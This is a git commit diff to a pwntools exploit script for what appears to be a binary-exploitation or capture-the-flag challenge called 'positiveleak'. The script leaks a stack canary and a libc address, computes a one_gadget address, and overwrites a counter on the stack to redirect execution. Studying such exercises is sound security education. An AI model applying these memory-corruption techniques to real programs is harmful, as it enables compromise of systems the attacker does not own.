117aa2f5e5d75bec93ee4dcc2551471e79ecc05e
gio-del <giovanni.delucia@polimi.it>
2023-11-28 21:56:51 +0100

    positiveleak update

--- rop/positiveleak/script.py
+++ rop/positiveleak/script.py
@@ -23,7 +23,7 @@ def add_numbers(size, first_value, values):
     p.sendline(p32(0))
     p.recvuntil(b"How many would you add?> ")
     p.sendline(b'6')
-    print(p.recvuntil(b"#> "))
+    p.recvuntil(b"#> ")
     p.sendline(b"%d" % first_value)
     for v in values:
         p.recvuntil(b"#> ")
@@ -43,7 +43,7 @@ def stack_offset(size):
 LIBC = ELF("./libc-2.35.so")
 
 # Leak canary and libc
-add_numbers(6, 0, [0,0,0, 0, 73014444031, 0]) # 73014444031 = 0x10_ffffffff
+add_numbers(6, 1, [2, 3, 4, 5, 73014444031, 7]) # 73014444031 = 0x10_ffffffff
 leak_canary = leak_from_print(10)
 leak_libc = leak_from_print(14)
 sleep(0.1)
@@ -52,35 +52,36 @@ print("[!] canary: %#x" % leak_canary)
 print("[!] leak: %#x" % leak_libc)
 LIBC.address = leak_libc - 0x29D90
 print("[!] libc: %#x" % LIBC.address)
-one_gadget_offset = 0x50a37 #other gadgets 0xebcf1 0xebcf5 0xebcf8 0xebd52 0xebdaf 0xebdb3
+one_gadget_offset = 0x50a37 # working gadgets 0x50a37 0xebdaf 0xebdb3, not working gadgets: 0xebcf1 0xebcf5 0xebcf8 0xebd52 
 LIBC.one_gadget = LIBC.address + one_gadget_offset
 print("[!] one_gadget: %#x" % LIBC.one_gadget)
 
-# Second Stage
+# Second Part
 input('Start Second Part')
-stack_num = 50
-stack_dist = int(stack_offset(stack_num) / 8) + 1
+stack_num = 40
+stack_dist = stack_offset(stack_num) // 8 + 1 # how many number we have to write until the counter variable
+print('stack_num: %d, stack_dist: %d' % (stack_num, stack_dist))
 
 p.recvuntil(b"> ")
 p.sendline(b"0")
 p.recvuntil(b"> ")
 p.sendline(b"%d" % stack_num)
 
-for i in range(0, stack_dist):
+for i in range(stack_dist):
     p.recvuntil(b"> ")
     p.sendline(b"0")
 
 counter = int(hex(stack_dist + 5) + "00000000", 16)
+print('counter: %#x' % counter)
 
 p.recvuntil(b"> ")
-p.sendline(b"%d" % counter)
+p.sendline(b"%d" % counter) # where to write (i)
 
 p.recvuntil(b"> ")
-p.sendline(b"%d" % LIBC.one_gadget)
+p.sendline(b"%d" % LIBC.one_gadget) # what to write (num)
 
-for i in range(0, 9):
-    p.recvuntil(b"> ")
-    p.sendline(b"0")
+p.recvuntil(b"> ")
+p.sendline(b"0")
 
 p.recvuntil(b"> ")
 p.sendline(b"-1")
